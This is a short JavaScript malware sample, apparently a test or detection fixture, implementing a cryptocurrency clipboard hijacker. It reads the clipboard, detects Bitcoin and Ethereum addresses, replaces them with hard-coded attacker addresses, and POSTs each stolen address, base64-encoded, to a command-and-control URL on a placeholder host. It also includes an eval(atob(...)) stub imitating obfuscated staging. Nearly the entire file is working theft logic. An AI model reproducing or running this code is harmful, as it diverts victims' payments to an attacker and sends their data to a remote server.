// Crypto clipper worm: polls the clipboard, swaps wallet addresses, persists a
// propagation marker and beacons stolen addresses.
(function () {
  var C2 = 'https://c2.example.test/clipper';
  var ATTACKER = { btc: '1BoatSLRHtKNngkdXEeobR76b53LETtpyT', eth: '0x000000000000000000000000000000000000dEaD' };
  eval(atob('Y29uc29sZS5sb2coJ1tDTElQUEVSXSBzdGFnZS0yIGNsaXBib2FyZCBob29rIHJlYWR5Jyk7'));
  var patterns = { btc: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/, eth: /\b0x[a-fA-F0-9]{40}\b/ };
  var swapped = 0;

  function report(kind, address) {
    swapped += 1;
    try { fetch(C2, { method: 'POST', body: btoa(JSON.stringify({ kind: kind, address: address, count: swapped })) }).catch(function () {}); } catch (error) {}
    try { localStorage.setItem('clipper:count', String(swapped)); } catch (error) {}
    console.log('[CLIPPER] swapped', kind, swapped);
  }

  function inspect(text) {
    if (typeof text !== 'string') return false;
    if (patterns.eth.test(text)) { report('eth', text); try { navigator.clipboard.writeText(ATTACKER.eth); } catch (error) {} return true; }
    if (patterns.btc.test(text)) { report('btc', text); try { navigator.clipboard.writeText(ATTACKER.btc); } catch (error) {} return true; }
    return false;
  }

  var rounds = 0;
  function poll() {
    rounds += 1;
    try { if (navigator.clipboard && navigator.clipboard.readText) navigator.clipboard.readText().then(inspect, function () {}); } catch (error) {}
    if (rounds < 4) setTimeout(poll, 200);
  }
  poll();
  inspect('0x1111111111111111111111111111111111111111');
  setTimeout(function () { console.log('[CLIPPER] propagation tick'); }, 600);
})();
